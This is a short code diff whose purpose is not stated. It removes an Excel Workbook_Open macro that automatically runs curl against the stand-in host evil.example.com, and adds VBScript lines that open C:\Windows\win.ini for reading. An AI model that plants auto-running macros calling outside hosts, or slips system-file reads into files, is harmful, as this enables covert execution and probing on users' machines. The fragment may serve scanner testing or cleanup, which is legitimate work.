@@ -1,3 +1,2 @@
-Private Sub Workbook_Open()
-  CreateObject("WScript.Shell").Run "curl http://evil.example.com/"
-End Sub
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objFile = objFSO.OpenTextFile("C:\Windows\win.ini", 1)
